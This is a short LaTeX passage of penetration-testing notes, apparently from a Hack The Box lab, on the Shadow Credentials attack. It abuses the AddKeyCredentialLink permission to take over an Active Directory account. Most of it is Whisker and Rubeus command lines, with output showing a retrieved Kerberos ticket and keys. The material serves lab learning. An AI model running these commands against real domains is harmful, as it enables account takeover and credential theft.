\section{Key credential abuse}

This attack is described in
\href{https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab}{Shadow
Credentials: Abusing Key Trust Account Mapping for Account Takeover}.

Using the permission \verb+AddKeyCredentialLink+, it is possible to add “Key
Credentials” to the attribute \verb+msDS-KeyCredentialLink+ 
of the target user/computer object and then perform Kerberos authentication as
that account using \verb+PKINIT+. 

then executing the command line provided for \verb+Rubeus+ we obtein the NTLM
\begin{verbatim}
C:\Users\btables\Desktop>.\whisker add /target:SFLOWERS /dc:10.10.11.175

...SNIP...
Rubeus.exe asktgt /user:SFLOWERS /certificate:MIIJsAIBAzCCCWwGCSqGSIb3DQEHAaSqGS
...SNIP...
/password:"ORzbqu1VzP82H5G8" /domain:outdated.htb /dc:10.10.11.175 /getcredentials /show
...SNIP...
[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=SFLOWERS
[*] Building AS-REQ (w/ PKINIT preauth) for: 'outdated.htb\SFLOWERS'
[*] Using domain controller: 10.10.11.175:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF0jCCBc6gAwIBBaEDAgEWooIE5zCCBONhggTfMIIE26ADAgEFoQ4bDE9VVERBVEVELkhUQqIhMB+g
...SNIP...
      MDJaqA4bDE9VVERBVEVELkhUQqkhMB+gAwIBAqEYMBYbBmtyYnRndBsMb3V0ZGF0ZWQuaHRi

  ServiceName              :  krbtgt/outdated.htb
  ServiceRealm             :  OUTDATED.HTB
  UserName                 :  SFLOWERS
  UserRealm                :  OUTDATED.HTB
  StartTime                :  10/12/2022 1:28:02 AM
  EndTime                  :  10/12/2022 11:28:02 AM
  RenewTill                :  10/19/2022 1:28:02 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  sN5DpS7kQepeI5tv5I/q+Q==
  ASREP (key)              :  03250DCA8CC8E9BA02485E8C847C76D3

\end{verbatim}

more info in \href{https://pentestlab.blog/2022/02/07/shadow-credentials/}{Shadow
Credentials}



